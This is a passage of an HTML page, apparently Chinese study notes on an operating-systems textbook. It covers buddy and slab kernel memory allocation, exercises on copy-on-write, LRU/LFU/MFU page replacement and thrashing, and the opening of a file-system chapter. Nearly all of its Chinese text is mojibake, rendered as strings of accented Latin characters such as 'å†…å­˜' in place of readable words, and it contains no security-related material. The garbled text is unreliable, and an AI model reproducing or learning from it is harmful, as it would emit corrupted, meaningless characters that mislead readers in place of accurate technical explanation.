class="markdownIt-Anchor" href="#972-win32-apiä¸­çš„å…±äº«å†…å­˜"></a> 9.7.2 Win32 APIä¸­çš„å…±äº«å†…å­˜</h3><h3 id="973-å†…å­˜æ˜ å°„io"><a class="markdownIt-Anchor" href="#973-å†…å­˜æ˜ å°„io"></a> 9.7.3 å†…å­˜æ˜ å°„I/O</h3><h2 id="98-å†…æ ¸å†…å­˜çš„åˆ†é…"><a class="markdownIt-Anchor" href="#98-å†…æ ¸å†…å­˜çš„åˆ†é…"></a> 9.8 å†…æ ¸å†…å­˜çš„åˆ†é…</h2><h3 id="981-buddyç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#981-buddyç³»ç»Ÿ"></a> 9.8.1 Buddyç³»ç»Ÿ</h3><p>â€œBuddyç³»ç»Ÿ â€ ä»ç‰©ç†ä¸Šè¿ç»­çš„å¤§å°å›ºå®šçš„æ®µä¸Šè¿›è¡Œåˆ†é…ã€‚å†…å­˜æŒ‰2å¹‚çš„å¤§å°æ¥è¿›è¡Œåˆ†é…ï¼Œ å³ 4 KBã€ 8 KBã€ 16 KBç­‰ã€‚ å¦‚æœè¯·æ±‚å¤§å°ä¸ä¸º 2 çš„äº‹ï¼Œ é‚£ä¹ˆéœ€è¦è°ƒæ•´åˆ°ä¸‹ä¸€ä¸ªæ›´å¤§çš„ 2 çš„å¹‚ã€‚ ä¾‹å¦‚ï¼Œ è¯·æ±‚å¤§å°ä¸º 11KBï¼Œ é‚£ä¹ˆä¼šæŒ‰ 16 KB æ¥è¯·æ±‚ã€‚</p><p><img src="/posts/8ce3e425/image-20220103194814856.png" alt="image-20220103194814856"></p><p>Buddy ç³»ç»Ÿçš„ä¸€ä¸ª<strong>ä¼˜ç‚¹</strong>æ˜¯å¯é€šè¿‡åˆå¹¶è€Œå¿«é€Ÿåœ°å½¢æˆæ›´å¤§çš„æ®µã€‚ ä¾‹å¦‚ï¼Œå¦‚æœå›¾ 9.27 ä¸­çš„CL è¢«é‡Šæ”¾ï¼Œé‚£ä¹ˆCL å’ŒCR å¯åˆå¹¶æˆ 64KB çš„æ®µã€‚è€Œè¿™ä¸ªæ®µBL åˆå¯åŒBR åˆå¹¶è€Œå¾—åˆ° 128KBçš„æ®µã€‚ æœ€ç»ˆï¼Œ å¾—åˆ°äº†åŸæ¥çš„å¤§å°ä¸º 256KB çš„æ®µã€‚<br>Buddy ç³»ç»Ÿçš„ä¸€ä¸ªæ˜æ˜¾<strong>ç¼ºç‚¹</strong>æ˜¯ç”±äºè°ƒæ•´åˆ°ä¸‹ä¸€ä¸ª 2 çš„äº‹å®¹æ˜“äº§ç”Ÿç¢ç‰‡ã€‚ ä¾‹å¦‚ï¼Œ 33KBçš„å†…å­˜è¯·æ±‚åªèƒ½ç”¨ 64KB çš„æ®µæ¥æ»¡è¶³ã€‚ äº‹å®ä¸Šï¼Œå¯èƒ½æœ‰ 50%çš„å†…å­˜ä¼šå› ç¢ç‰‡è€Œæµªè´¹ã€‚ ä¸‹é¢è®¨è®ºå¦ä¸€ç§æ²¡æœ‰ç¢ç‰‡æŸå¤±çš„å†…å­˜åˆ†é…ã€‚</p><h3 id="982-slabåˆ†é…"><a class="markdownIt-Anchor" href="#982-slabåˆ†é…"></a> 9.8.2 slabåˆ†é…</h3><p>å†…æ ¸åˆ†é…çš„å¦ ä¸€ç§æ–¹æ¡ˆæ˜¯ slab åˆ†é…ã€‚ slab æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªç‰©ç†ä¸Šè¿ç»­çš„é¡µç»„æˆçš„ã€‚ é«˜é€Ÿç¼“å­˜ï¼ˆ cache ï¼‰å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ª slabã€‚ æ¯ä¸ªå†…æ ¸æ•°æ®ç»“æ„éƒ½æœ‰ä¸€ä¸ª cacheï¼Œ å¦‚è¿›ç¨‹æè¿°ç¬¦ã€æ–‡ä»¶å¯¹è±¡ã€ ä¿¡å·é‡ç­‰ã€‚ æ¯ä¸ª cache å«æœ‰å†…æ ¸æ•°æ®ç»“æ„çš„å¯¹è±¡å®ä¾‹ã€‚ ä¾‹å¦‚ï¼Œ ä¿¡å·é‡ cache å­˜å‚¨ç€ä¿¡å·é‡å¯¹è±¡ï¼Œè¿›ç¨‹æè¿°ç¬¦ cache å­˜å‚¨ç€è¿›ç¨‹æè¿°ç¬¦å¯¹è±¡ã€‚ å›¾ 9.28 æè¿° slabã€ cache åŠå¯¹è±¡ä¸‰è€…ä¹‹é—´çš„å…³ç³»ã€‚ è¯¥å›¾ä¸­æœ‰ä¸¤ä¸ª 3KB å¤§å°çš„å†…æ ¸å¯¹è±¡å’Œä¸‰ä¸ª 7KB å¤§å°çš„å†…æ ¸å¯¹è±¡ã€‚ å®ƒ<br>ä»¬åˆ†åˆ«ä½äºå„è‡ªçš„ cache ä¸Šã€‚</p><p><img src="/posts/8ce3e425/image-20220103195716302.png" alt="image-20220103195716302"></p><p>slabåˆ†é…å™¨æœ‰ä¸¤ä¸ªä¸»è¦ä¼˜ç‚¹ï¼š</p><p>â‘ æ²¡æœ‰å› ç¢ç‰‡è€Œå¼•èµ·çš„å†…å­˜æµªè´¹ã€‚ ç¢ç‰‡ä¸æ˜¯é—®é¢˜ï¼Œ è¿™æ˜¯å› ä¸ºæ¯ä¸ªå†…æ ¸æ•°æ®ç»“æ„éƒ½æœ‰ç›¸åº”çš„cacheï¼Œ è€Œæ¯ä¸ªcache éƒ½ç”±è‹¥å¹²slabç»„æˆï¼Œ è€Œæ¯ä¸ªslabåˆåˆ†ä¸ºè‹¥å¹²ä¸ªä¸å¯¹è±¡å¤§å°ç›¸  åŒçš„éƒ¨åˆ†ã€‚ å› æ­¤ï¼Œ å½“å†…æ ¸è¯·æ±‚å¯¹è±¡å†…å­˜æ—¶ï¼Œ slab åˆ†é…å™¨å¯ä»¥è¿”å›åˆšå¥½å¯ä»¥è¡¨ç¤ºå¯¹è±¡æ‰€éœ€çš„å†…å­˜ã€‚</p><p>â‘¡å†…å­˜è¯·æ±‚å¯ä»¥å¿«é€Ÿæ»¡è¶³ã€‚slab åˆ†é…å™¨å¯¹äºéœ€è¦ç»å¸¸ä¸æ–­åˆ†é…å†…å­˜ã€é‡Šæ”¾å†…å­˜æ¥è¯´ç‰¹åˆ«æœ‰æ•ˆï¼Œ è€Œæ“ä½œç³»ç»Ÿç»å¸¸è¿™æ ·åšã€‚ å†…å­˜åˆ†é…ä¸é‡Šæ”¾å¯èƒ½è´¹æ—¶ã€‚ ç„¶è€Œï¼Œ ç”±äºå¯¹è±¡é¢„å…ˆåˆ›å»ºï¼Œæ‰€ä»¥å¯ä» cache ä¸Šå¿«é€Ÿåˆ†é…ã€‚å¦å¤–ï¼Œå½“ç”¨å®Œå¯¹è±¡å¹¶é‡Šæ”¾æ—¶ï¼Œåªéœ€è¦æ ‡è®°ä¸ºç©ºé—²å¹¶ è¿”å›ç»™ cache,ä»¥ä¾¿ä¸‹æ¬¡å†ç”¨ã€‚</p><h2 id="99-å…¶ä»–è€ƒè™‘"><a class="markdownIt-Anchor" href="#99-å…¶ä»–è€ƒè™‘"></a> 9.9 å…¶ä»–è€ƒè™‘</h2><h3 id="991-é¢„è°ƒé¡µ"><a class="markdownIt-Anchor" href="#991-é¢„è°ƒé¡µ"></a> 9.9.1 é¢„è°ƒé¡µ</h3><h3 id="992-é¡µå¤§å°"><a class="markdownIt-Anchor" href="#992-é¡µå¤§å°"></a> 9.9.2 é¡µå¤§å°</h3><h3 id="993-tlbèŒƒå›´"><a class="markdownIt-Anchor" href="#993-tlbèŒƒå›´"></a> 9.9.3 TLBèŒƒå›´</h3><h3 id="994-åå‘é¡µè¡¨"><a class="markdownIt-Anchor" href="#994-åå‘é¡µè¡¨"></a> 9.9.4 åå‘é¡µè¡¨</h3><h3 id="995-ç¨‹åºç»“æ„"><a class="markdownIt-Anchor" href="#995-ç¨‹åºç»“æ„"></a> 9.9.5 ç¨‹åºç»“æ„</h3><h3 id="996-ioäº’é”"><a class="markdownIt-Anchor" href="#996-ioäº’é”"></a> 9.9.6 I/Oäº’é”</h3><h2 id="910-æ“ä½œç³»ç»Ÿå®ä¾‹"><a class="markdownIt-Anchor" href="#910-æ“ä½œç³»ç»Ÿå®ä¾‹"></a> 9.10 æ“ä½œç³»ç»Ÿå®ä¾‹</h2><h3 id="9101-windows-xp"><a class="markdownIt-Anchor" href="#9101-windows-xp"></a> 9.10.1 Windows XP</h3><h3 id="9102-solaris"><a class="markdownIt-Anchor" href="#9102-solaris"></a> 9.10.2 Solaris</h3><h2 id="911-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#911-ä¹ é¢˜"></a> 9.11 ä¹ é¢˜</h2><blockquote><p>9.2 è®¨è®ºæŒ‰éœ€è°ƒé¡µæ‰€éœ€çš„ç¡¬ä»¶æ”¯æŒã€‚</p></blockquote><p>é¡µè¡¨ã€TLBã€æ¬¡çº§å­˜å‚¨å™¨</p><blockquote><p>9.3 ä»€ä¹ˆæ˜¯å†™æ—¶å¤åˆ¶ï¼Ÿä½•æ—¶è¿™ç§ç‰¹ç‚¹æœ‰æ•ˆï¼Ÿå®ç°è¿™ç§ç‰¹ç‚¹éœ€è¦ä»€ä¹ˆç¡¬ä»¶æ”¯æŒï¼Ÿ</p></blockquote><p><strong>å†™æ—¶å¤åˆ¶</strong>ï¼ˆcopy-on-write ï¼‰å…è®¸çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å¼€å§‹æ—¶å…±äº«åŒä¸€é¡µé¢ã€‚ è¿™äº›é¡µé¢æ ‡è®°ä¸ºå†™æ—¶å¤åˆ¶é¡µï¼Œ å³å¦‚æœä»»ä½•ä¸€ä¸ªè¿›ç¨‹éœ€è¦å¯¹é¡µè¿›è¡Œå†™æ“ä½œï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªå…±äº«é¡µçš„å‰¯æœ¬ã€‚ä»¥å…è®¸ä¸¤ä¸ªç¨‹åºåˆ†åˆ«è®¿é—®ä¸åŒçš„å‰¯æœ¬ï¼Œè€Œä¸ä¼šç›¸äº’å¹²æ‰°ã€‚</p><p>å®ç°æ‰€éœ€çš„<strong>ç¡¬ä»¶æ”¯æŒ</strong>ç®€å•å¦‚ä¸‹ï¼šåœ¨æ¯æ¬¡å†…å­˜è®¿é—®æ—¶ï¼Œéœ€è¦æŸ¥é˜…é¡µè¡¨ä»¥æ£€æŸ¥é¡µæ˜¯å¦å…·æœ‰å†™ä¿æŠ¤ã€‚å¦‚æœå®ƒç¡®å®æ˜¯å†™ä¿æŠ¤çš„ï¼Œåˆ™ä¼šå‡ºç°é™·é˜±ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥è§£å†³æ­¤é—®é¢˜</p><blockquote><p>9.4 æŸå°è®¡ç®—æœºç»™å®ƒçš„ç”¨æˆ·æä¾›äº†2<sup>32</sup> B çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚è®¡ç®—æœºæœ‰2<sup>18</sup>B çš„ç‰©ç†å†…å­˜ã€‚è™šæ‹Ÿå†…å­˜ä½¿ç”¨é¡µé¢å¤§å°ä¸º 4096Bçš„åˆ†é¡µæœºåˆ¶å®ç°ã€‚ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹äº§ç”Ÿè™šæ‹Ÿåœ°å€ 11123456ï¼Œç°åœ¨è¯´æ˜ä¸€ä¸‹ç³»ç»Ÿæ€æ ·å»ºç«‹ç›¸åº”çš„ç‰©ç†åœ°å€ã€‚ åŒºåˆ†ä¸€ä¸‹è½¯ä»¶æ“ä½œå’Œç¡¬ä»¶æ“ä½œã€‚</p></blockquote><blockquote><p>9.5 å‡è®¾æœ‰ä¸€ä¸ªæŒ‰éœ€è°ƒé¡µå­˜å‚¨å™¨ï¼Œ é¡µè¡¨æ”¾åœ¨å¯„å­˜å™¨ä¸­ã€‚ å¤„ç†ä¸€ä¸ªé¡µé”™è¯¯ï¼Œ å½“æœ‰ç©ºçš„å¸§å¯ç”¨æˆ–è¢«ç½®æ¢çš„å¸§æ²¡æœ‰è¢«ä¿®æ”¹è¿‡æ—¶è¦ç”¨8 msï¼Œ å½“è¢«ç½®æ¢çš„å¸§è¢«ä¿®æ”¹è¿‡æ—¶ç”¨20msã€‚å­˜å‚¨å™¨å­˜å–æ—¶é—´ä¸ºlOOnsã€‚å‡è®¾è¢«ç½®æ¢çš„é¡µä¸­æœ‰70%è¢«ä¿®æ”¹è¿‡ï¼Œ æœ‰æ•ˆå­˜å–æ—¶é—´ä¸è¶…è¿‡200ns æ—¶æœ€å¤§å¯ä»¥æ¥å—çš„é¡µé”™è¯¯ç‡æ˜¯å¤šå°‘ï¼Ÿ</p></blockquote><p><img src="/posts/8ce3e425/image-20220112085440155.png" alt="image-20220112085440155"></p><blockquote><p>9.6 å‡å®šè¦ç›‘è§†æ—¶é’Ÿç®—æ³•çš„æŒ‡é’ˆç§»åŠ¨é€Ÿåº¦ï¼ˆå¯ç”¨æ¥è¡¨ç¤ºé¡µæ›¿æ¢çš„é€Ÿåº¦ï¼‰ã€‚ æ ¹æ®ä¸‹é¢ç°è±¡ï¼Œ å¯å¾—åˆ°ä»€ä¹ˆç»“è®ºï¼Ÿ<br>a. æŒ‡é’ˆç§»åŠ¨å¿«<br>b. æŒ‡é’ˆç§»åŠ¨æ…¢</p></blockquote><p>å¦‚æœæŒ‡é’ˆç§»åŠ¨å¾—å¾ˆå¿«ï¼Œé‚£ä¹ˆç¨‹åºä¼šåŒæ—¶è®¿é—®å¤§é‡é¡µé¢ã€‚æœ€æœ‰å¯èƒ½çš„æ˜¯ï¼Œåœ¨ä¸é¡µé¢å¯¹åº”çš„ä½è¢«æ¸…é™¤å’Œå†æ¬¡æ£€æŸ¥ä¹‹é—´çš„æ—¶é—´æ®µå†…ï¼Œé¡µé¢è¢«å†æ¬¡è®¿é—®ï¼Œå› æ­¤æ— æ³•è¢«æ›¿æ¢ã€‚è¿™ä¼šå¯¼è‡´åœ¨æ‰¾åˆ°å—å®³è€…é¡µé¢ä¹‹å‰å¯¹é¡µé¢è¿›è¡Œæ›´å¤šæ‰«æã€‚å¦‚æœæŒ‡é’ˆç§»åŠ¨ç¼“æ…¢ï¼Œé‚£ä¹ˆè™šæ‹Ÿå†…å­˜ç³»ç»Ÿå°†æå…¶é«˜æ•ˆåœ°æŸ¥æ‰¾æ›¿æ¢çš„å€™é€‰é¡µï¼Œè¿™è¡¨æ˜è®¸å¤šé©»ç•™é¡µæ²¡æœ‰è¢«è®¿é—®</p><blockquote><p>9.7 è®¨è®ºåœ¨ä½•ç§æƒ…å†µä¸‹æœ€å°‘ç»å¸¸ä½¿ç”¨é¡µæ›¿æ¢ç®—æ³•è¦æ¯”æœ€è¿‘æœ€å°‘ä½¿ç”¨é¡µç½®æ¢ç®—æ³•è¦å¥½ã€‚ å¹¶è®¨è®ºç›¸åæƒ…å†µã€‚</p></blockquote><p>å¶å‘æ€§çš„ã€å‘¨æœŸæ€§çš„æ‰¹é‡æŸ¥è¯¢æ“ä½œï¼ˆåŒ…å«å†·æ•°æ®ï¼‰ä¼šæ·˜æ±°æ‰å¤§é‡çš„çƒ­ç‚¹æ•°æ®ï¼Œå¯¼è‡´ LRU å‘½ä¸­ç‡æ€¥å‰§ä¸‹é™ï¼Œç¼“å­˜æ±¡æŸ“æƒ…å†µæ¯”è¾ƒä¸¥é‡ã€‚è¿™ç§æƒ…å†µä¸‹LFUç®—æ³•æ›´ä¼˜ã€‚</p><p>ç›¸åæƒ…å†µï¼šä¸€ä¸ªé¡µåœ¨è¿›ç¨‹å¼€å§‹æ—¶ä½¿ç”¨å¾ˆå¤šï¼Œ ä½†ä»¥åå°±ä¸å†ä½¿ç”¨ã€‚ ç”±äºå…¶ä½¿ç”¨è¿‡å¾ˆå¤šï¼Œ æ‰€ä»¥å®ƒæœ‰è¾ƒå¤§æ¬¡æ•°ï¼Œ LFUä¸ä¼šå°†å…¶æ›¿æ¢ï¼Œæ‰€ä»¥å³ä½¿ä¸å†ä½¿ç”¨ä»ç„¶ä¼šåœ¨å†…å­˜ä¸­ã€‚è¿™ç§æƒ…å†µä¸‹æ¯”LRUå·®ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><p>è€ƒè™‘ä¸‹é¢çš„é¡µä¸²ï¼š1 1 2 3 4 5 1ï¼Œå†…å­˜å¯å®¹çº³4é¡µï¼Œå½“è®¿é—®5æ—¶ï¼ŒLFUç®—æ³•å°†ä¼šæ›¿æ¢é™¤äº†1ä»¥å¤–çš„ä»»æ„ä¸€é¡µï¼Œè¿™æ ·æ¥ä¸‹æ¥è®¿é—®1æ—¶ï¼Œå¯ä»¥ä¸ç”¨æ›¿æ¢ã€‚</p><p>ç›¸åæƒ…å†µï¼Œå¦‚æœè€ƒè™‘ä¸‹é¢çš„é¡µä¸²ï¼š 1 2 3 4 5 2ï¼ŒLRUç®—æ³•çš„æ€§èƒ½æ›´å¥½ã€‚</p><blockquote><p>9.8 è®¨è®ºåœ¨ä½•ç§æƒ…å†µä¸‹æœ€å¤šç»å¸¸ä½¿ç”¨é¡µç½®æ¢ç®—æ³•è¦æ¯”æœ€å°‘è¿‘æ¥ä½¿ç”¨ç®—æ³•è¦å¥½ã€‚ å¹¶è®¨è®ºç›¸åæƒ…å†µã€‚</p></blockquote><p>MFUåŸºäºä»¥ä¸‹åŸç†å…·æœ‰æœ€å°æ¬¡æ•°çš„é¡µå¯èƒ½åˆšåˆšè°ƒè¿›æ¥ï¼Œ ä¸”è¿˜æ²¡æœ‰ä½¿ç”¨ã€‚</p><p>è€ƒè™‘å¯å®¹çº³ 4 é¡µçš„å†…å­˜ 1 2 3 4 4 4 5 1 ,MFU ç®—æ³•ä¼šç”¨ 5 æ›¿æ¢ 4 ï¼Œ è€Œ LRU åˆ™ç”¨5æ›¿æ¢1ï¼Œè¿™ç§æƒ…å†µLRUæ›´ä¼˜ã€‚</p><p>åœ¨å®è·µä¸­å¾ˆå°‘ä½¿ç”¨MFU</p><blockquote><p>9.9 VAXNMS ç³»ç»Ÿé‡‡ç”¨ FIFO ç½®æ¢ç®—æ³•æ¥å¤„ç†å¸¸é©»é¡µå’Œç»å¸¸ä½¿ç”¨é¡µçš„ç©ºé—²å¸§æ± ã€‚ å‡å®šç©ºé—²å¸§æ± é‡‡ç”¨æœ€è¿‘æœ€å°‘ä½¿ç”¨ç½®æ¢ç®—æ³•ã€‚ è¯•å›ç­”ä¸‹åˆ—é—®é¢˜ï¼š<br>aå¦‚æœå‡ºç°é¡µé”™è¯¯è€Œæ‰€éœ€é¡µä¸åœ¨ç©ºé—²å¸§æ± ä¸­ï¼Œ é‚£ä¹ˆæ–°è¯·æ±‚é¡µå¦‚ä½•ä»ç©ºé—²ä¸­åˆ†é…ï¼Ÿ<br>b.å¦‚æœå‡ºç°é¡µé”™è¯¯ä¸”æ‰€éœ€é¡µåœ¨ç©ºé—²å¸§æ± ä¸­ï¼Œé‚£ä¹ˆæ–°è¯·æ±‚é¡µå¦‚ä½•ç”±å¸¸é©»é¡µå’Œç»å¸¸ä½¿ç”¨é¡µçš„ç©ºé—²æ± <br>æ¥æ»¡è¶³ï¼Ÿ<br>c.å¦‚æœå¸¸é©»é¡µçš„æ•°é‡ä¸ºlï¼Œ é‚£ä¹ˆè¿™æ ·æ–¹æ³•ä¼šé€€åŒ–æˆä»€ä¹ˆï¼Ÿ<br>d.å¦‚æœç©ºé—²å¸§æ± çš„é¡µæ•°é‡ä¸º0 ï¼Œ é‚£ä¹ˆè¿™æ ·æ–¹æ³•ä¼šé€€åŒ–æˆä»€ä¹ˆï¼Ÿ</p></blockquote><blockquote><p>9.10 å‡è®¾ä¸€ä¸ªå…·æœ‰ä¸‹é¢æ—¶é—´åˆ©ç”¨ç‡çš„æŒ‰éœ€è°ƒé¡µç³»ç»Ÿï¼š</p><p>CPUåˆ©ç”¨ç‡   20%<br>åˆ†é¡µç£ç›˜    97.7%<br>å…¶ä»–IOè®¾å¤‡   5%</p><p>è¯•è¯´æ˜ä¸‹é¢å“ªä¸€é¡¹å¯èƒ½æé«˜CPUçš„åˆ©ç”¨ç‡ï¼Œ ä¸ºä»€ä¹ˆï¼Ÿ<br>a.å®‰è£…ä¸€ä¸ªæ›´å¿«çš„CPU<br>b.å®‰è£…ä¸€ä¸ªæ›´å¤§çš„åˆ†é¡µç£ç›˜<br>c.æé«˜å¤šé“ç¨‹åºçš„ç¨‹åº¦<br>d.é™ä½å¤šé“ç¨‹åºçš„ç¨‹åº¦<br>e.å®‰è£…æ›´å¤šå†…å­˜<br>f.å®‰è£…ä¸ªæ›´å¿«çš„ç¡¬ç›˜ï¼Œ æˆ–å¯¹å¤šä¸ªç¡¬ç›˜ç”¨å¤šä¸ªæ§åˆ¶å™¨<br>g.åŠ å…¥é¢„çº¦å¼é¡µé¢è°ƒåº¦ç®—æ³•é¢„å–é¡µ<br>h.å¢åŠ é¡µé¢å¤§å°</p></blockquote><p>abcä¸è¡Œ</p><p>å…¶ä»–å¯ä»¥</p><p>hå¯èƒ½åŠ å¯èƒ½å‡</p><blockquote><p>ä¸€ä¸ªé¡µç½®æ¢ç®—æ³•åº”ä½¿å‘ç”Ÿé¡µé¢é”™è¯¯çš„æ¬¡æ•°æœ€å°åŒ–ã€‚ å¯ä»¥é€šè¿‡å°†ä½¿ç”¨é¢‘ç‡é«˜çš„é¡µå¹³å‡åˆ†é…åˆ°æ•´ä¸ªå†…å­˜ï¼Œ è€Œä¸æ˜¯åªä½¿ç”¨å°‘æ•°å‡ ä¸ªå¸§æ¥è¾¾åˆ°è¿™ç§æœ€å°åŒ–ã€‚ å¯ä»¥å¯¹æ¯ä¸ªå¸§è®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨æ¥è®°å½•ä¸å¸§ç›¸å…³çš„é¡µæ•°ã€‚ é‚£ä¹ˆå½“ç½®æ¢ä¸€ä¸ªé¡µæ—¶å°±å¯ä»¥æŸ¥æ‰¾é¡µæ•°æœ€å°‘çš„å¸§æ¥ç½®æ¢ã€‚</p><p>a. åŸºäºè¿™ä¸ªåŸºæœ¬æ€æƒ³å®šä¹‰ä¸€ä¸ªé¡µç½®æ¢ç®—æ³•ã€‚ ç‰¹åˆ«æ³¨æ„çš„é—®é¢˜ï¼š</p><p>â‘ è®¡æ•°å™¨åˆå§‹åŒ–å€¼æ˜¯å¤šå°‘ï¼Ÿ</p><p>â‘¡ä»€ä¹ˆæ—¶å€™è®¡æ•°å¢åŠ ï¼Ÿ</p><p>â‘¢ä»€ä¹ˆæ—¶å€™è®¡æ•°å‡å°‘ï¼Ÿ</p><p>â‘£æ€æ ·é€‰æ‹©è¢«ç½®æ¢çš„é¡µï¼Ÿ</p><p>b. è®¾æœ‰ 4 ä¸ªå¸§ï¼Œ å¯¹äºä¸‹é¢çš„é¡µå¼•ç”¨åºåˆ—ï¼Œ ä½ çš„ç®—æ³•ä¼šå‘ç”Ÿå¤šå°‘æ¬¡é¡µé”™è¯¯ï¼Ÿ</p><p>1,2,3,4,5,3,4, 1,6,7,8, 7, 8,9,7,8,9, 5, 4, 5, 4, 2<br>c. æœ€ä¼˜é¡µç½®æ¢ç®—æ³•å¯¹äº 4 å¸§çš„ b ä¸­çš„é¡µå¼•ç”¨åºåˆ—æœ€å°é¡µé”™è¯¯æ•°ä¸ºå¤šå°‘ï¼Ÿ</p></blockquote><p>a.å®šä¹‰ä¸€ ä¸ªé¡µé¢ç½®æ¢ç®—æ³•è§£å†³ é—®é¢˜ ï¼š</p><p>â‘ è®¡æ•°å™¨åˆå§‹å€¼â€”â€”0 ;</p><p>â‘¡è®¡æ•°å™¨å€¼å¢åŠ â€”â€”æ¯å½“æ–°çš„ä¸€é¡µä¸æ­¤å¸§ç›¸å…³è” ï¼›</p><p>â‘¢è®¡æ•°å™¨å€¼å‡å°‘â€”â€”æ¯å½“ä¸æ­¤å¸§ç›¸å…³è”çš„ä¸€ä¸ªé¡µä¸å†éœ€è¦ ï¼›</p><p>â‘£æ€æ ·é€‰æ‹©è¦è¢«ç½®æ¢çš„é¡µä¸€ä¸€æ‰¾åˆ°å¸¦æœ‰æœ€å°è®¡æ•°å™¨å€¼çš„å¸§ã€‚ä½¿ç”¨å…ˆè¿›å…ˆå‡ºç®—æ³•è§£é™¤å…¶å…³ç³»</p><p>b. 14ä¸ªé¡µé”™è¯¯</p><p>c. 11ä¸ªé¡µé”™è¯¯</p><blockquote><p>9.14 å‡è®¾ä¸€ä¸ªè¯·æ±‚è°ƒé¡µç³»ç»Ÿå…·æœ‰ä¸€ä¸ªå¹³å‡è®¿é—®å’Œä¼ è¾“æ—¶é—´ä¸º 20ms çš„åˆ†é¡µç£ç›˜ã€‚ åœ°å€è½¬æ¢æ˜¯é€šè¿‡åœ¨ä¸»å­˜ä¸­çš„é¡µè¡¨æ¥è¿›è¡Œçš„ï¼Œ æ¯æ¬¡å†…å­˜è®¿é—®æ—¶é—´ä¸º1é—·ã€‚ è¿™æ ·ï¼Œ æ¯ä¸ªé€šè¿‡é¡µè¡¨è¿›è¡Œçš„å†…å­˜è®¿é—®éƒ½è¦è®¿é—®å†…å­˜ä¸¤æ¬¡ã€‚ ä¸ºäº†æé«˜æ€§èƒ½ï¼Œ åŠ å…¥ä¸€ä¸ªç›¸å…³å­˜å‚¨å™¨ï¼Œ å½“é¡µè¡¨é¡¹åœ¨ç›¸å…³å­˜å‚¨å™¨ä¸­æ—¶ï¼Œ å¯ä»¥å‡å°‘å¯¹å†…å­˜çš„è®¿é—®æ¬¡æ•°ã€‚ å‡è®¾ 80%çš„è®¿é—®å‘ç”Ÿåœ¨ç›¸å…³å­˜å‚¨å™¨ä¸­ï¼Œ è€Œä¸”å‰©ä¸‹ä¸­çš„ 10%ï¼ˆæˆ–æ€»çš„ 2%ï¼‰ ä¼šå¯¼è‡´é¡µé”™è¯¯ã€‚å†…å­˜çš„æœ‰æ•ˆè®¿é—®æ—¶é—´æ˜¯å¤šå°‘ï¼Ÿ</p></blockquote><blockquote><p>ï¼ï¼ï¼9.15 é¢ ç°¸çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿç³»ç»Ÿæ€æ ·æ£€æµ‹é¢ ç°¸ï¼Ÿï¼æ—¦ç³»ç»Ÿæ£€æµ‹åˆ°é¢ ç°¸ï¼Œ ç³»ç»Ÿæ€æ ·æ¥æ¶ˆé™¤è¿™ä¸ªé—®é¢˜ï¼Ÿ</p></blockquote><p>åˆ†é…çš„é¡µæ•°å°‘äºè¿›ç¨‹æ‰€éœ€çš„æœ€å°é¡µæ•°æ—¶å‘ç”Ÿé¢ ç°¸ï¼Œå¹¶è¿«ä½¿å®ƒä¸æ–­åœ°å‘ç”Ÿé¡µé”™è¯¯ã€‚</p><p>è¯¥ç³»ç»Ÿå¯é€šè¿‡å¯¹æ¯”å¤šé“ç¨‹åºçš„ç¨‹åº¦å’ŒCPUåˆ©ç”¨ç‡çš„ç¨‹åº¦ï¼Œä»¥æ­¤æ¥æ£€æµ‹é¢ ç°¸ã€‚<br>é™ä½å¤šé“ç¨‹åºçš„ç¨‹åº¦å¯ä»¥æ¶ˆé™¤é¢ ç°¸ã€‚</p><blockquote><p>9.16 ä¸€ä¸ªè¿›ç¨‹æ˜¯å¦å¯æœ‰ä¸¤ä¸ªå·¥ä½œé›†åˆï¼Œ ä¸€ä¸ªç”¨äºæ•°æ®ï¼Œ å¦ä¸€ç”¨äºä»£ç ï¼Ÿè¯•è§£é‡Šä¹‹ã€‚</p></blockquote><blockquote><p>9.17 åœ¨å·¥ä½œé›†åˆæ¨¡å‹ä¸­ï¼Œ å‚æ•°A ç”¨æ¥å®šä¹‰å·¥ä½œé›†åˆçª—å£çš„å¤§å°ã€‚å½“ä¸ºA è®¾ç½®ä¸€ä¸ªå°å€¼æ—¶ï¼Œ å¯¹é¡µé”™è¯¯é¢‘ç‡åŠæ­£åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œè¿›ç¨‹çš„æ•°é‡æœ‰ä½•å½±å“ï¼Ÿå½“ä¸ºAè®¾ç½®ä¸€ä¸ªå¤§å€¼æ—¶ï¼Œ åˆå¦‚ä½•ï¼Ÿ</p></blockquote><blockquote><p>9.20 å‡è®¾æœ‰ä¸€ä¸ªç³»ç»Ÿå…è®¸ä¸ºè¿›ç¨‹åˆ†é…ä¸åŒå¤§å°çš„é¡µã€‚è¿™æ ·çš„è¯·æ±‚é¡µç³»ç»Ÿæœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿå¦‚ä½•ä¿®æ”¹è™šæ‹Ÿå†…å­˜ç³»ç»Ÿä»¥æä¾›è¿™ç§åŠŸèƒ½ï¼Ÿ</p></blockquote><h1 id="ç¬¬10ç« -æ–‡ä»¶ç³»ç»Ÿæ¥å£"><a class="markdownIt-Anchor" href="#ç¬¬10ç« -æ–‡ä»¶ç³»ç»Ÿæ¥å£"></a> ç¬¬10ç«  æ–‡ä»¶ç³»ç»Ÿæ¥å£</h1><h2 id="101-æ–‡ä»¶æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#101-æ–‡ä»¶æ¦‚å¿µ"></a> 10.1 æ–‡ä»¶æ¦‚å¿µ</h2><p>ä»ç”¨æˆ·è§’åº¦è€Œè¨€ï¼Œæ–‡ä»¶æ˜¯é€»è¾‘å¤–å­˜çš„æœ€å°åˆ†é…å•å…ƒ ï¼Œå³æ•°æ®é™¤éåœ¨æ–‡ä»¶ä¸­ï¼Œå¦åˆ™ä¸èƒ½å†™åˆ°å¤–å­˜ã€‚ é€šå¸¸ï¼Œ æ–‡ä»¶è¡¨ç¤ºç¨‹åºï¼ˆæºå½¢å¼å’Œç›®æ 